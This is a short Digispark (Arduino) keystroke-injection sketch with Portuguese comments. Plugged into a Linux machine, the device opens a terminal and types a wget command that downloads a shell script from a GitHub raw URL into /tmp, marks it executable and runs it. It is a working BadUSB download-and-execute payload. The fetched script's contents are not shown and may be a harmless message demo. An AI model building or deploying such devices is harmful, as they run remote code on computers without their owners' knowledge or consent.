#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.delay(3000);

  // Abre o terminal (CTRL+ALT+T - Ubuntu/Linux)
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(5000);

  // Baixa e executa o script
  DigiKeyboard.println("wget -qO /tmp/mensagem.sh https://raw.githubusercontent.com/fabiobrilhante/exemplo/main/mensagem.sh && chmod +x /tmp/mensagem.sh && /tmp/mensagem.sh");

  // Para o loop (executa apenas uma vez)
  while (true) {
    DigiKeyboard.delay(10000);
  }
}
